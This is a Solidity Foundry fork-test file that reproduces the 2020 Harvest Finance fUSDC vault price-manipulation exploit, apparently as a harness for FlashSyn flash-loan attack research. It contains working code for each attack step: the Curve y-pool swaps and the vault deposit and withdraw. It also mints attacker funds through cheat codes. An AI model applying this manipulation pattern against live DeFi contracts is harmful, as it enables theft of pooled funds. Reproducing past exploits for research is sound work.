// SPDX-License-Identifier: MIT
pragma solidity >0.4.21;

// Harvest Finance exploit (fUSDC vault), 26 Oct 2020, block 11129474
// tx: 0x35f8d2f572fceaac9288e5d462117850ef2694786992a8c3f6d02612277b0877
// The attacker depresses USDC in the Curve y-pool, deposits the now-cheap USDC
// into the fUSDC vault (whose share price reads Curve), restores the pool, and
// redeems the shares for more USDC than it put in.

import {DSTest} from "ds-test/test.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {Strings} from "mylib/StringCon.sol";


interface IUSDC {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function configureMinter(address minter, uint256 minterAllowedAmount) external returns (bool);
    function masterMinter() external view returns (address);
    function mint(address _to, uint256 _amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

// USDT's approve/transfer return no value (non-standard ERC20).
interface IUSDT {
    function approve(address spender, uint256 value) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external;
}

// Curve y-pool (yDAI/yUSDC/yUSDT/yTUSD). Underlying indices: 1 = USDC, 2 = USDT.
interface ICurve {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
    function balances(uint256 i) external view returns (uint256);
}

// Harvest fUSDC vault (shares are 6-decimal).
interface IfUSDC {
    function deposit(uint256 amount) external;
    function withdraw(uint256 numberOfShares) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Harvest_USDT is DSTest, stdCheats {
    Vm internal constant vm = Vm(HEVM_ADDRESS);
    address payable constant attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
    IUSDC internal constant USDC = IUSDC(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    IUSDT internal constant USDT = IUSDT(address(0xdAC17F958D2ee523a2206206994597C13D831ec7));
    ICurve internal constant CURVE = ICurve(address(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51));
    IfUSDC internal constant fUSDC = IfUSDC(address(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE));

    // Flash-loan amounts the historical exploit entered with.
    uint256 constant USDC_CAPITAL = 50000000e6;      // 50,000,000 USDC
    uint256 constant USDT_CAPITAL = 18308555417594;  // 18,308,555.417594 USDT

    function setUp() public {
        vm.label(attacker, "Attacker");

        // Fund USDC through the real masterMinter (same path as the Euler example).
        address minter = address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58);
        address MasterMinter = USDC.masterMinter();
        vm.startPrank(MasterMinter);
        USDC.configureMinter(minter, 2 ** 256 - 1);
        vm.stopPrank();
        vm.startPrank(minter);
        USDC.mint(attacker, USDC_CAPITAL);
        vm.stopPrank();

        // USDT has no mint hook; write the balance slot directly (balances mapping is slot 2)
        // and assert it took, so a wrong slot fails loud instead of silently giving 0.
        vm.store(address(USDT), keccak256(abi.encode(attacker, uint256(2))), bytes32(USDT_CAPITAL));
        require(USDT.balanceOf(attacker) == USDT_CAPITAL, "USDT funding failed");
        require(USDC.balanceOf(attacker) == USDC_CAPITAL, "USDC funding failed");

        vm.startPrank(attacker);
        USDT.approve(address(CURVE), type(uint256).max);
        USDC.approve(address(CURVE), type(uint256).max);
        USDC.approve(address(fUSDC), type(uint256).max);
    }

    // Profit is measured over both tokens; the parser reads the two integers after "FlashSyn".
    function profitSummary() public view returns (string memory) {
        return Strings.append(
            "FlashSyn: ",
            Strings.appendWithSpace(USDT.balanceOf(address(attacker)) / 1e6, USDC.balanceOf(address(attacker)) / 1e6)
        );
    }

    function testExample0() public {
        emit log("=================== Separator ==================");
        // Action: Curve_USDT2USDC
        CURVE.exchange_underlying(2, 1, 17000000 * 1e6, 0);
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample1() public {
        emit log("=================== Separator ==================");
        // Action: Curve_USDC2USDT
        CURVE.exchange_underlying(1, 2, 17000000 * 1e6, 0);
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample2() public {
        emit log("=================== Separator ==================");
        // Action: fUSDC_deposit
        fUSDC.deposit(49000000 * 1e6);
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample3() public {
        fUSDC.deposit(49000000 * 1e6);
        emit log("=================== Separator ==================");
        // Action: fUSDC_withdraw
        fUSDC.withdraw(49000000 * 1e6);
        emit log("=================== Separator ==================");
        revert("");
    }
}
